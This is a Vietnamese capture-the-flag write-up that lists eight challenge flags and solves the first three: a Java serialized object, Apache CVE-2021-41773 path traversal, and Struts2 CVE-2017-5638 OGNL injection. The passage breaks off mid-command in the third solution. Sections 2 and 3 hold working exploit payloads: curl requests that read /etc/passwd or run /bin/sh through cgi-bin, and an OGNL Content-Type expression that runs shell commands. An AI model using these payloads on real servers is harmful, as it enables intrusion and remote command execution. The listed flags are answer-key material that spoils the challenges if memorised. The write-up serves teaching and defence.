# Tuyển tập Challenge — Set D — Lời giải CHI TIẾT (Tiếng Việt, bản mở rộng)

> **Phiên bản này** được viết lại và mở rộng sâu về kỹ thuật, kiểm chứng trực tiếp với các file đề
> đã tải về (tính hash, `xxd`, `strings`, `openssl`, phân tích pcap). Mục tiêu: người mới cũng theo
> được, hiểu *tại sao* chứ không chỉ *làm gì*.
>
> **Nguyên tắc an toàn:** TẤT CẢ phân tích đều là **tĩnh** (đọc byte, đọc mã nguồn, tính hash, đọc
> gói tin). **Không chạy** bất kỳ file `.exe`/binary nào.

---

## 0. Mục lục & bảng tổng quan

### 0.1. Bối cảnh
Đây là **tuyển tập challenge (Set D)** theo mô hình CTF (Capture The Flag). Trong CTF kiểu
**Jeopardy**, mỗi thử thách giấu một chuỗi bí mật gọi là **flag** (khuôn dạng `flag{...}`). Tìm ra
flag và nộp lên hệ thống thì được điểm. Tuyển tập gồm 8 bài thuộc nhiều mảng: Reverse, Web,
Forensics, OSINT.

### 0.2. Bảng challenge

| # | Challenge | Category | Flag | Độ khó tương đối |
|---|-----------|----------|------|------------------|
| 1 | Đối tượng tuần tự hoá | Reverse / Java Deserialization | `flag{1434978065}` | Dễ |
| 2 | Lỗ hổng đã biết — Path Traversal | Web / CVE công khai | `flag{N_oht_jnf_perngrq}` | Dễ–TB |
| 3 | Lỗ hổng đã biết — OGNL RCE | Web / CVE công khai | `flag{Fbzrqnl_vg_jvyy_or_hahfrq}` | TB |
| 4 | Nhận diện CDN | OSINT / Network | `flag{akamai}` | Rất dễ |
| 5 | Giải mã phiên TLS | Forensics / giải mã TLS | `flag{cf8236571e9dd3bcaf44b188bba4f15d}` | TB |
| 6 | Tràn số nguyên | Reverse / Integer Overflow | `flag{Something_happens_when_exceeds_limit_value}` | TB |
| 7 | Chuỗi SSRF tới CSDL | Web / SQLi + SSRF + gopher→MySQL | `flag{e9ces9p4z9jrai9c3zrs}` | Khó |
| 8 | Khôi phục file từ FTP | Forensics / FTP trong pcap | `flag{It's_dangerous_to_use_FTP}` | Dễ–TB |

### 0.3. Mục lục
1. Đối tượng tuần tự hoá (Java Serialized Object)
2. Lỗ hổng đã biết — Path Traversal (Apache)
3. Lỗ hổng đã biết — OGNL RCE (Struts2)
4. Nhận diện nhà cung cấp CDN
5. Giải mã phiên TLS từ pcap
6. Tràn số nguyên (Integer Overflow)
7. Chuỗi tấn công SSRF tới cơ sở dữ liệu
8. Khôi phục file truyền qua FTP
9. [Phụ lục: tổng kết kỹ thuật](#9-phụ-lục-tổng-kết-kỹ-thuật)

---

## 0.4. Kiểm chứng file đề (hash & metadata)

Tất cả file đề được tải về và kiểm tra. **Điểm thú vị:** tên mỗi file chính là **giá trị MD5** của
nội dung file đó (đây là cách đặt tên file gốc). Tôi đã tính lại hash và **xác nhận khớp**:

| File (đường dẫn tương đối) | Size (byte) | MD5 | SHA1 |
|----------------------------|-------------|-----|------|
| `D1-serialized-object/dataFile_e3347688032cb381a44796d46232ab9d` | 82 | `e3347688032cb381a44796d46232ab9d` | `4d161ab281fc047bc1b0f3b1f0bd7b67dc4dbe4c` |
| `D5-tls-capture/64ef3b043d56cbbb8f873cfa96cd3e4e.zip` | 1 827 616 | `64ef3b043d56cbbb8f873cfa96cd3e4e` | `e9c09e7f22df1dc86e36d044b5722bdca2c83461` |
| `D6-integer-overflow/binary_e2b191e6b2bb80471d8c4cdb96002207.zip` | 9 997 | `873bf1324482bed82e569f080fe28a30` | `6e8cd2e913e3173c8bdc7677311e04ebc3036d91` |
| `D6-integer-overflow/.../binary_...e2b191e6....exe` (trong zip) | 19 456 | — | — |
| `D6-integer-overflow/source_b8848652bef5d195b8d98fe880057d73.cp` | 2 554 | `b8848652bef5d195b8d98fe880057d73` | `6a6bb1cf8cd4280a2b680c595515931066afdf68` |
| `D8-ftp-capture/capture_8688e1a1263c414450b12985e0d5620b.pcapng` | 12 040 | `8688e1a1263c414450b12985e0d5620b` | `069549649cb3e41bcaba9a2c6f5a62cf4b6b2bb1` |

> Lưu ý: tên file gốc của `dataFile_...` và file `.zip` **chính là** MD5 (khớp 100%). Hai file còn lại có
> tiền tố riêng nhưng phần hex cũng là MD5 của chính file (`binary_<md5>.zip`, `capture_<md5>.pcapng`).

### ⚠️ Các điểm đính chính / làm rõ (bổ sung kiểm chứng)
- **Unlock:** Mô tả phổ biến nói "thêm private key để giải mã". Kiểm tra `ssl.conf` trong đề cho thấy
  dòng **`SSLCipherSuite kRSA`** — server bị **ép chỉ dùng trao khoá RSA**. Đây mới là lý do *gốc rễ*
  vì sao chỉ cần private key là giải mã được (xem mục 5). Mô tả phổ biến không nêu chi tiết này.
- **Known Vulnerability 1 & 2:** flag hiển thị bị **ROT13**. Giải ROT13 ra câu tiếng Anh có nghĩa
  (`A_bug_was_created`, `Someday_it_will_be_unused`). Tuy nhiên **flag hợp lệ để nộp là bản ROT13
  nguyên trạng** như trong bảng — không phải bản đã giải. Ghi rõ để tránh nhầm.
- Không phát hiện mâu thuẫn số liệu nào khác giữa writeup và file thật.

---

## 1. Đối tượng tuần tự hoá (Java Serialized Object)

### (a) Đề bài & metadata
- **Tên:** Đối tượng tuần tự hoá
- **Category:** Reverse Engineering / Java Deserialization
- **File đính kèm:** `D1-serialized-object/dataFile_e3347688032cb381a44796d46232ab9d`
  - Size: **82 byte**
  - MD5: `e3347688032cb381a44796d46232ab9d` (= tên file)
  - SHA1: `4d161ab281fc047bc1b0f3b1f0bd7b67dc4dbe4c`
- **Mô tả:** Đề chỉ đưa một file dữ liệu, không kèm lời dẫn. Nhiệm vụ là tự nhận dạng định dạng và
  trích ra flag.

### (b) Kiến thức nền

**CTF "Reverse/Misc" kiểu này là gì?** Bạn nhận một mẩu dữ liệu nhị phân và phải (1) nhận dạng nó
là định dạng gì, (2) đọc/giải mã để lấy thông tin giấu bên trong. Ở đây dữ liệu là **Java
serialized object**.

**Serialization (tuần tự hoá) là gì?**
Trong lập trình hướng đối tượng, một *object* sống trong bộ nhớ (RAM) với các trường dữ liệu. Khi
muốn **lưu object ra file** hoặc **gửi qua mạng**, ta phải biến nó thành một chuỗi byte tuyến tính —
đó là *serialization*. Chiều ngược lại, dựng object trở lại từ chuỗi byte, là *deserialization*.
Java có cơ chế sẵn: class `java.io.ObjectOutputStream` để ghi, `java.io.ObjectInputStream` để đọc.

**Định dạng Java Serialization — mổ xẻ từng byte.**
Một luồng serialized của Java luôn mở đầu bằng:
- `AC ED` — **magic number** (hằng `STREAM_MAGIC`), giống như `PK` của ZIP hay `MZ` của EXE, dùng
  để nhận dạng định dạng.
- `00 05` — **version** (`STREAM_VERSION` = 5).

Sau đó là các *thẻ* (tag byte) mô tả nội dung. Một vài tag quan trọng:
- `0x73` = `'s'` = `TC_OBJECT` — bắt đầu một object.
- `0x72` = `'r'` = `TC_CLASSDESC` — mô tả class (class descriptor): tên class, serialVersionUID,
  danh sách trường.
- `0x78` = `'x'` = `TC_ENDBLOCKDATA`.
- `0x70` = `'p'` = `TC_NULL` (đánh dấu không còn class cha).
- Trước một chuỗi tên (như tên class, tên trường) là 2 byte **độ dài** (big-endian) rồi tới các ký
  tự ASCII.

**Vì sao biết đây là số `Long`?** Trong luồng có chuỗi `java.lang.Long` và một trường tên `value`
kiểu `J`. Trong đặc tả JVM, mỗi kiểu nguyên thuỷ có một ký tự: `I`=int, `J`=**long (64-bit)**,
`Z`=boolean, `B`=byte, `D`=double... Vậy object này là một `Long` duy nhất, với trường `value` kiểu
`long`, và 8 byte cuối luồng chính là giá trị.

### (c) Trinh sát ban đầu
```bash
file D1-serialized-object/dataFile_e3347688032cb381a44796d46232ab9d
# → Java serialization data, version 5
xxd D1-serialized-object/dataFile_e3347688032cb381a44796d46232ab9d
```
`file` dựa vào magic `AC ED 00 05` để kết luận ngay đây là Java serialized. Lệnh `xxd` cho hexdump
đầy đủ (chỉ 82 byte nên đọc tay được).

### (d) Phân tích từng byte (reasoning "tại sao")
Hexdump thực tế của file:
```
00000000: aced 0005 7372 000e 6a61 7661 2e6c 616e  ....sr..java.lan
00000010: 672e 4c6f 6e67 3b8b e490 cc8f 23df 0200  g.Long;.....#...
00000020: 014a 0005 7661 6c75 6578 7200 106a 6176  .J..valuexr..jav
00000030: 612e 6c61 6e67 2e4e 756d 6265 7286 ac95  a.lang.Number...
00000040: 1d0b 94e0 8b02 0000 7870 0000 0000 5588  ........xp....U.
00000050: 0711                                     ..
```
Giải mã tuần tự:

| Offset | Byte | Ý nghĩa |
|--------|------|---------|
| 0x00 | `ac ed` | STREAM_MAGIC |
| 0x02 | `00 05` | STREAM_VERSION = 5 |
| 0x04 | `73` | `TC_OBJECT` — bắt đầu object |
| 0x05 | `72` | `TC_CLASSDESC` — mô tả class |
| 0x06 | `00 0e` | độ dài tên class = 14 |
| 0x08 | `6a..4c6f6e67` | `"java.lang.Long"` (14 ký tự) |
| 0x16 | `3b 8b e4 90 cc 8f 23 df` | serialVersionUID của Long |
| 0x1e | `02` | cờ: SC_SERIALIZABLE |
| 0x1f | `00 01` | số trường = 1 |
| 0x21 | `4a` (`'J'`) | kiểu trường = long |
| 0x22 | `00 05 "value"` | tên trường = `"value"` |
| ... | `78` | `TC_ENDBLOCKDATA` |
| ... | `72 ... "java.lang.Number"` | class cha = Number |
| 0x46 | `70` | `TC_NULL` — hết chuỗi class cha |
| 0x47 | `00 00 00 00 55 88 07 11` | **GIÁ TRỊ long = 8 byte** |

8 byte giá trị `00 00 00 00 55 88 07 11` đọc theo big-endian = `0x0000000055880711`.

**Tại sao không cần chạy gì?** Vì `Long` chỉ bọc một con số, ta đọc thẳng 8 byte cuối là xong.
Chuyển `0x55880711` sang thập phân:
- `0x55000000` = 1 426 063 360
- `0x00880711` = 8 914 705
- Tổng = **1 434 978 065**

**Hướng dễ sai:** người mới hay cố "chạy" file hoặc dùng `strings` và không thấy gì rồi bối rối.
Mấu chốt là nhận ra magic `ac ed` ⇒ định dạng chuẩn ⇒ đọc theo đặc tả.

### (e) Lời giải / cách lấy flag

**Cách 1 — đọc thẳng (tĩnh, khuyến nghị):**
```python
# Python: lấy 8 byte cuối và đọc như long big-endian
import struct
data = open("D1-serialized-object/dataFile_e3347688032cb381a44796d46232ab9d","rb").read()
value = struct.unpack(">q", data[-8:])[0]   # ">q" = big-endian signed 64-bit
print(value)                                 # 1434978065
```
Giải thích: `struct.unpack(">q", ...)` đọc 8 byte theo thứ tự big-endian (`>`) thành số nguyên 64-bit
có dấu (`q`). Kết quả là 1434978065.

**Cách 2 — deserialize đúng chuẩn Java (như mô tả phổ biến):**
```java
import java.io.*;
public class Solve {
    public static void main(String[] args) throws Exception {
        ObjectInputStream in = new ObjectInputStream(
            new FileInputStream("dataFile_e3347688032cb381a44796d46232ab9d"));
        Object o = in.readObject();   // JVM tự dựng lại thành java.lang.Long
        System.out.println(o);        // in: 1434978065
    }
}
```
Biên dịch & chạy:
```bash
javac Solve.java && java Solve
# 1434978065
```
`ObjectInputStream.readObject()` đọc magic, class descriptor, rồi 8 byte value để tạo ra một
`Long(1434978065L)`. `println` gọi `toString()` in ra số.

### (f) Flag & ý nghĩa
```
flag{1434978065}
```
Bài học: nhận dạng định dạng qua **magic bytes** là bước đầu tiên của mọi forensics/reverse. Java
serialized rất phổ biến (và cũng là nguồn của nhiều lỗ hổng *insecure deserialization* ngoài đời).

### (g) Cạm bẫy & cách khác
- Đừng nhầm thứ tự byte: Java luôn **big-endian**. Nếu đọc little-endian sẽ ra số sai.
- Có thể dùng công cụ `SerializationDumper` (NickstaDB) để in cây object cho đẹp mắt.
- Nếu object phức tạp hơn (HashMap, mảng...), đọc tay sẽ cực; khi đó deserialize bằng Java là nhanh
  nhất — nhưng *cẩn thận với insecure deserialization* nếu dữ liệu không tin cậy.

### (h) Tham khảo
- Java Object Serialization Specification (Oracle), mục "Terminal Symbols and Constants".
- Công cụ: `SerializationDumper`, `file`, `xxd`.

### (i) Đào sâu: bảng tag & cây object dạng cây
Đặc tả serialization dùng các hằng *terminal* (mỗi hằng là 1 byte). Bảng rút gọn hay gặp:
| Byte | Tên hằng | Ý nghĩa |
|------|----------|---------|
| `0x70` | TC_NULL | tham chiếu null / hết class cha |
| `0x71` | TC_REFERENCE | tham chiếu lại một object đã thấy |
| `0x72` | TC_CLASSDESC | mô tả class |
| `0x73` | TC_OBJECT | một object mới |
| `0x74` | TC_STRING | một chuỗi |
| `0x75` | TC_ARRAY | một mảng |
| `0x77` | TC_BLOCKDATA | khối dữ liệu thô |
| `0x78` | TC_ENDBLOCKDATA | kết thúc khối/field của một class |
| `0x7A` | TC_BLOCKDATALONG | khối dữ liệu dài |

Diễn lại luồng của bài dưới dạng cây (như `SerializationDumper` in ra):
```
STREAM_MAGIC - 0xac ed
STREAM_VERSION - 5
Contents
  TC_OBJECT
    TC_CLASSDESC
      className: java.lang.Long
      serialVersionUID: 0x3b8be490cc8f23df
      newHandle 0x00 7e 00 00
      classDescFlags: 0x02  (SC_SERIALIZABLE)
      fieldCount: 1
        Long - name: value  type: long (J)
      classAnnotations: TC_ENDBLOCKDATA
      superClassDesc:
        TC_CLASSDESC
          className: java.lang.Number
          serialVersionUID: 0x86ac951d0b94e08b
          classDescFlags: 0x02 (SC_SERIALIZABLE)
          fieldCount: 0
          superClassDesc: TC_NULL
    classdata:
      java.lang.Long:
        value: 1434978065   (0x0000000055880711)
```
Từ cây này thấy rõ: object là `Long`, kế thừa `Number`, trường `value` = 1434978065.

### (j) serialVersionUID là gì?
`serialVersionUID` (8 byte sau tên class) là "số phiên bản" của class, để khi deserialize, JVM kiểm
tra class hiện tại có *tương thích* với dữ liệu đã serialize không. Với `java.lang.Long`, giá trị
cố định là `0x3b8be490cc8f23df`; `java.lang.Number` là `0x86ac951d0b94e08b` — khớp đúng các byte ta
thấy trong hexdump (offset 0x16 và 0x3c). Đây là một cách *kiểm chứng chéo* rằng ta đọc đúng.

### (k) Cơ chế `Serializable` trong Java (kiến thức nền sâu)
Một class chỉ serialize được nếu **implements `java.io.Serializable`** — đây là *marker interface*
(giao diện đánh dấu, không có method nào). Khi gặp interface này, JVM bật cơ chế tuần tự hoá:
- **Thứ tự ghi:** JVM ghi class descriptor của class *con* trước, rồi đệ quy lên class *cha*
  (`superClassDesc`), cho tới khi gặp `TC_NULL`. Khi *đọc*, dữ liệu trường (`classdata`) lại được
  khôi phục theo thứ tự từ cha xuống con. Trong bài này: `Long` (con) mô tả trước, `Number` (cha)
  sau; rồi phần `classdata` chứa 8 byte `value` của `Long`.
- **`transient`:** trường gắn từ khoá `transient` sẽ KHÔNG được ghi (bỏ qua). `Long.value` không
  transient nên được ghi đầy đủ.
- **Handle & tham chiếu:** mỗi object/class descriptor được gán một *handle* (bắt đầu `0x7E0000`).
  Nếu cùng một object xuất hiện lại, JVM ghi `TC_REFERENCE` + handle thay vì ghi lại toàn bộ — tránh
  lặp và xử lý được cấu trúc vòng. Luồng của bài quá đơn giản nên không có tham chiếu lặp.
- **`writeObject`/`readObject` tuỳ biến:** một class có thể tự định nghĩa 2 method này để ghi/đọc
  theo cách riêng; `Long` dùng mặc định nên chỉ là 8 byte thô.

### (l) Vì sao là `long` (8 byte) chứ không phải `int` (4 byte)?
Trường có ký tự kiểu **`J`** (= `long`, 64-bit) nên phần dữ liệu là **8 byte**: `00 00 00 00 55 88
07 11`. 32 bit thấp là `0x55880711`; 32 bit cao là `0x00000000`, nên giá trị vẫn gọn trong tầm int
nhưng *được lưu dưới dạng long*. Nếu ai nhầm chỉ đọc 4 byte (`int`) sẽ lấy sai (đọc phải `00 00 00
00` phần cao → ra 0). Luôn khớp **số byte đọc với ký tự kiểu**: `I`=4, `J`=8, `S`=2, `B`=1, `D`=8,
`F`=4, `C`=2, `Z`=1.

### (m) Liên hệ bảo mật: Insecure Deserialization
Cùng cơ chế này là nguồn của lớp lỗ hổng **insecure deserialization** (OWASP Top 10): nếu ứng dụng
`readObject()` trên dữ liệu **do kẻ tấn công kiểm soát**, kẻ tấn công có thể gửi object của các class
"gadget" (ví dụ trong thư viện Apache Commons Collections) để khi deserialize sẽ kích hoạt chuỗi lời
gọi dẫn tới **RCE**. Công cụ nổi tiếng: `ysoserial`. Bài CTF này lành tính (chỉ một `Long`), nhưng
hiểu cơ chế giúp bạn nhận ra vì sao "deserialize dữ liệu lạ" là nguy hiểm — đừng bao giờ
`readObject` dữ liệu không tin cậy trong code thật.

---

## 2. Lỗ hổng đã biết — Path Traversal (Apache)

### (a) Đề bài & metadata
- **Tên:** Lỗ hổng đã biết — Path Traversal
- **Category:** Web — khai thác **lỗ hổng đã công bố (CVE)**
- **Mục tiêu:** một web server lắng nghe trên **cổng 8081**.
- **File đính kèm:** không có (bài online, tấn công trực tiếp dịch vụ).
- **Mô tả/Gợi ý:** tên bài nói thẳng "Known Vulnerability" — tức là *không cần tìm bug mới*, chỉ cần
  nhận ra phần mềm/phiên bản đang chạy rồi áp dụng exploit công khai.

### (b) Kiến thức nền

**Web server & HTTP header `Server`.** Khi trình duyệt (hay `curl`) gửi request HTTP, server trả về
các *response header*, trong đó header `Server:` thường tiết lộ tên + phiên bản phần mềm, ví dụ
`Server: Apache/2.4.49 (Unix)`. Thông tin phiên bản này cực kỳ quý: biết phiên bản là tra được nó
dính CVE nào.

**CVE là gì?** *Common Vulnerabilities and Exposures* — mã định danh chuẩn cho một lỗ hổng đã công
bố, dạng `CVE-<năm>-<số>`. Mỗi CVE mô tả lỗi, phiên bản bị ảnh hưởng, cách vá.

**CVE-2021-41773 — Apache HTTP Server 2.4.49 Path Traversal → RCE.**
- *Path Traversal (đi ngược thư mục)* là lỗi cho phép truy cập file ngoài thư mục web bằng cách chèn
  `../` (lên một cấp). Ví dụ yêu cầu `GET /../../../../etc/passwd` để đọc file hệ thống.
- Apache bình thường **chuẩn hoá** URL và chặn `../`. Nhưng ở **phiên bản 2.4.49**, một thay đổi
  trong hàm chuẩn hoá đường dẫn khiến Apache **không chặn** chuỗi `.%2e` — trong đó `%2e` là dạng
  **URL-encode của dấu chấm `.`**. Nghĩa là `.%2e/` được giải mã *sau* bước kiểm tra nên vượt qua
  được bộ lọc, trở thành `../`.
- Điều kiện khai thác đọc file: có một thư mục được cấu hình `Require all granted` (thường
  `/cgi-bin/` hoặc alias trỏ ra ngoài `DocumentRoot`). Nếu bật thêm `mod_cgi`, lỗi còn leo thang
  thành **RCE** (thực thi lệnh).
- `/etc/passwd` là file liệt kê tài khoản Unix. Mỗi dòng có 7 trường ngăn bởi `:`:
  `tên:x:UID:GID:`**`GECOS`**`:home:shell`. Trường thứ 5 (**GECOS**) là "tên đầy đủ/ghi chú" — đề
  giấu flag ở đây.

### (c) Trinh sát ban đầu
```bash
curl -sI http://TARGET:8081/        # -I: chỉ lấy header
# → Server: Apache/2.4.49 (...)     # phiên bản "tố cáo" CVE-2021-41773
```
Nhìn thấy `2.4.49` là lập tức liên hệ CVE-2021-41773 (cũng có biến thể 2.4.50 → CVE-2021-42013).

### (d) Phân tích & reasoning
- Vì sao chọn đọc `/etc/passwd`? Vì đây là file chắc chắn tồn tại, ai đọc cũng được, và đề thường
  giấu flag trong trường GECOS của một user mới tạo — một "mẹo" quen thuộc của ban tổ chức.
- Hướng dễ sai: nhiều người thử ngay RCE phức tạp. Nhưng với CTF "known vuln", chỉ cần **LFI (đọc
  file)** qua path traversal là đủ, đơn giản và chắc ăn hơn.

### (e) Exploit đầy đủ (có chú thích)

**Payload path traversal (đọc `/etc/passwd`):**
```bash
curl -s --path-as-is \
  'http://TARGET:8081/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
```
Giải thích từng phần:
- `--path-as-is`: bảo `curl` **đừng** tự rút gọn `../` trong URL — ta cần chuỗi đi nguyên vẹn tới
  server.
- `/cgi-bin/` : một thư mục được Apache cho phép truy cập (điểm tựa để traversal).
- `.%2e/` : chính là `../` sau khi `%2e`→`.`. Lặp lại nhiều lần để leo đủ số cấp lên `/`.
- `/etc/passwd` : đích cần đọc.

Có thể dùng PoC công khai (Lucas Souza, exploit-db #50383) tự động hoá việc này.

**Output mẫu (rút gọn):**
```
root:x:0:0:root:/root:/bin/bash
...
ctfuser:x:1000:1000:flag{N_oht_jnf_perngrq}:/home/ctfuser:/bin/bash
                     ^^^^^^^^^^^^^^^^^^^^^^^  (trường GECOS chứa flag)
```
Flag nằm đúng trường thứ 5 của dòng user.

### (f) Flag & ý nghĩa
```
flag{N_oht_jnf_perngrq}
```
Flag bị **ROT13** (xoay mỗi chữ cái 13 vị trí). Giải ROT13:
```bash
echo 'flag{N_oht_jnf_perngrq}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# → flag{A_bug_was_created}
```
Câu gốc "A bug was created" là gợi ý vui về việc lỗ hổng *được tạo ra* ở bản 2.4.49.
**Lưu ý nộp bài:** flag hợp lệ là bản hiển thị `flag{N_oht_jnf_perngrq}` (bản ROT13), không phải
bản đã giải.

### (g) Cạm bẫy & cách khác
- Nếu `/cgi-bin/` không tồn tại, thử các alias khác (`/icons/`) hoặc đổi số lượng `%2e%2e/`.
- Với bản 2.4.50, cần double-encode (`%%32%65`) → đó là CVE-2021-42013.
- Nếu bật `mod_cgi`, có thể đổi sang POST tới `/cgi-bin/.%2e/.../bin/sh` để RCE.

### (h) Tham khảo
- CVE-2021-41773 — Qualys blog: https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013
- PoC: https://www.exploit-db.com/exploits/50383

### (i) Đào sâu: vì sao chính xác bản 2.4.49 dính lỗi?
Apache có một hàm nội bộ tên `ap_normalize_path` để "làm sạch" đường dẫn trong URL trước khi ánh xạ
ra file. Hàm này có nhiệm vụ gộp `//`, xử lý `./`, và quan trọng là triệt tiêu `../`. Ở bản 2.4.49,
một thay đổi (commit tái cấu trúc việc giải mã percent-encoding) khiến **thứ tự xử lý bị đảo**:
Apache *kiểm tra* `..` trên chuỗi *trước khi* giải mã `%2e`, rồi mới giải mã. Hệ quả: chuỗi `.%2e`
qua được bước kiểm tra (vì lúc đó nó chưa phải `..`), nhưng sau khi giải mã lại thành `..` và được
dùng để dựng đường dẫn file. Đó là lỗ hổng.

Điều kiện cần để đọc được file:
1. Có một `<Directory>` hoặc alias cho phép truy cập ra ngoài `DocumentRoot` với
   `Require all granted` (mặc định `cgi-bin` thường có).
2. File đích phải Apache đọc được (quyền hệ thống).

Minh hoạ phép "đếm cấp": từ `/var/www/cgi-bin/` muốn tới `/etc/passwd` cần lùi khoảng 3–4 cấp, nên
payload lặp `%2e%2e/` vài lần cho chắc. Thừa vài cấp `../` ở gốc `/` cũng vô hại (vì `/` lùi nữa vẫn
là `/`), nên cứ cho dư.

### (j) Biến thể RCE (chỉ để hiểu, không bắt buộc cho bài này)
Nếu server bật `mod_cgi`, có thể biến LFI thành RCE bằng cách POST vào một chương trình trong
`cgi-bin`:
```bash
curl -s --path-as-is -X POST --data 'echo; id' \
  'http://TARGET:8081/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
```
Ở đây ta "chạy" `/bin/sh` như một CGI, truyền lệnh qua thân POST. Với bài CTF này chỉ cần LFI đọc
`/etc/passwd` là đủ nên không cần tới bước này.

### (k) Góc phòng thủ & phát hiện
- **Vá:** nâng cấp lên Apache ≥ 2.4.51 (2.4.50 vẫn còn lỗi biến thể → CVE-2021-42013).
- **Giảm thiểu tạm:** đặt `Require all denied` cho các thư mục ngoài DocumentRoot; tắt `mod_cgi`
  nếu không dùng.
- **Phát hiện trong log:** tìm chuỗi `%2e`, `.%2e`, `cgi-bin/.` trong access log; IDS/WAF có rule
  sẵn cho CVE-2021-41773.

---

## 3. Lỗ hổng đã biết — OGNL RCE (Struts2)

### (a) Đề bài & metadata
- **Tên:** Lỗ hổng đã biết — OGNL RCE
- **Category:** Web — khai thác CVE công khai (Java / Apache Struts2)
- **Mục tiêu:** web server **cổng 8080**, là trang **Struts2 Showcase** (ứng dụng demo chính thức
  của framework Apache Struts2).
- **File đính kèm:** không có.

### (b) Kiến thức nền

**Apache Struts2** là framework Java MVC để xây web app. "Struts2 Showcase" là app mẫu kèm theo bản
phân phối, hay bị để lộ trên server test → mục tiêu quen thuộc.

**OGNL (Object-Graph Navigation Language)** là ngôn ngữ biểu thức mà Struts2 dùng để truy xuất/gán
dữ liệu giữa form và object Java. Vấn đề: nếu dữ liệu **do người dùng kiểm soát** bị đưa vào bộ
*đánh giá (evaluate)* OGNL, kẻ tấn công có thể viết biểu thức gọi `Runtime.exec(...)` → **RCE**.

**CVE-2017-5638 — lỗ hổng Struts2 kinh điển (vụ Equifax).**
- Nằm ở bộ phân tích phần tải lên đa phần (Jakarta **Multipart parser**).
- Khi header **`Content-Type`** của request không hợp lệ, Struts2 cố dựng thông báo lỗi và **vô tình
  evaluate chuỗi Content-Type như biểu thức OGNL**.
- Kẻ tấn công nhét biểu thức OGNL vào `Content-Type`; server đánh giá nó và chạy lệnh shell tuỳ ý.

**Nmap NSE** (*Nmap Scripting Engine*) là hệ thống script của Nmap; có sẵn script dò đúng CVE này.

### (c) Trinh sát ban đầu
```bash
# Quét nhanh xem dịch vụ có dính CVE-2017-5638 không
nmap -p8080 --script http-vuln-cve2017-5638 TARGET
# → báo VULNERABLE nếu dính
```

### (d) Phân tích & reasoning
Tên bài + trang Struts2 Showcase ⇒ nghĩ ngay tới chuỗi CVE RCE của Struts2; CVE-2017-5638 là phổ
biến và dễ khai thác nhất. Endpoint thường dùng là một `*.action` của showcase (vd `showcase.action`
hoặc `/struts2-showcase/...`). Xác nhận bằng NSE trước khi bắn exploit để tránh mò.

### (e) Exploit đầy đủ

**Dùng `struts-pwn` (mazen160):**
```bash
python struts-pwn.py \
  --url 'http://TARGET:8080/struts2-showcase/showcase.action' \
  --exploit -c 'cat /flag*'
```
Cơ chế bên trong (bản chất của payload Content-Type):
```
Content-Type: %{(#_='multipart/form-data').
  (#cmd='cat /flag*').
  (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
  (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
  (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
  (#process=#p.start()).(#ros=...getOutputStream()).
  (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))...}
```
Giải thích: toàn bộ chuỗi `%{...}` là biểu thức OGNL. Nó (1) đặt lại marker multipart cho hợp lệ,
(2) chọn shell theo HĐH, (3) tạo `ProcessBuilder` chạy `cat /flag*`, (4) copy output lệnh vào
response để ta đọc được kết quả.

**Output mẫu:** tool báo lỗi *chunked-encoding* (do server trả response không chuẩn khi bị khai
thác) **nhưng flag vẫn in ra** trong phần thân phản hồi.

### (f) Flag & ý nghĩa
```
flag{Fbzrqnl_vg_jvyy_or_hahfrq}
```
Cũng là **ROT13**:
```bash
echo 'flag{Fbzrqnl_vg_jvyy_or_hahfrq}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# → flag{Someday_it_will_be_unused}
```
Câu "Someday it will be unused" ám chỉ mong muốn các phần mềm dính lỗi cũ sẽ bị loại bỏ.
**Flag nộp** là bản ROT13 `flag{Fbzrqnl_vg_jvyy_or_hahfrq}`.

### (g) Cạm bẫy & cách khác
- Nếu `struts-pwn` lỗi, có thể bắn payload thủ công bằng `curl -H "Content-Type: %{...}"`.
- Phải đúng endpoint `.action`; bắn vào trang tĩnh sẽ không trigger parser multipart.
- Có nhiều CVE Struts2 khác (S2-045/046 = CVE-2017-5638, S2-057...); NSE/metasploit giúp khoanh vùng.

### (h) Tham khảo
- CVE-2017-5638 (S2-045).
- Tool: `struts-pwn` (công cụ khai thác Struts2); module Metasploit `struts2_content_type_ognl`.

### (i) Đào sâu: cơ chế lỗi & vì sao Content-Type bị evaluate
Khi một request có `Content-Type` bắt đầu bằng `multipart/form-data`, Struts2 chuyển cho bộ xử lý
upload (Jakarta Multipart). Nếu chuỗi `Content-Type` **sai định dạng** (parser không đọc nổi),
Jakarta ném ngoại lệ. Struts2 cố dựng **thông điệp lỗi** cho người dùng, và trong quá trình đó nó
đưa chuỗi `Content-Type` (do kẻ tấn công kiểm soát) vào một ngữ cảnh mà **OGNL được phép đánh giá**.
Vì OGNL có thể gọi phương thức Java bất kỳ (kể cả `Runtime.exec`), kẻ tấn công chèn biểu thức để
chạy lệnh.

**Phân tích payload OGNL (từng mảnh):**
```
%{ ... }                      -> cú pháp "đánh giá biểu thức" của OGNL
(#_='multipart/form-data')    -> đặt lại marker cho parser không chết sớm
(#context[...]=...)           -> tắt các cờ an toàn (MemberAccess) để được gọi method tự do
@java.lang.System@getProperty('os.name')   -> đọc tên HĐH để chọn shell phù hợp
new java.lang.ProcessBuilder(#cmds)        -> tạo tiến trình chạy lệnh
IOUtils.copy(process.getInputStream(), response.getOutputStream())  -> đẩy output lệnh vào HTTP response
```
Mấu chốt là đoạn tắt `MemberAccess` (sandbox của OGNL) — nếu không tắt, Struts2 chặn gọi method
tĩnh. Đây là lý do payload dài và trông rối.

**Request thô ví dụ (dạng curl):**
```bash
curl -s 'http://TARGET:8080/struts2-showcase/showcase.action' \
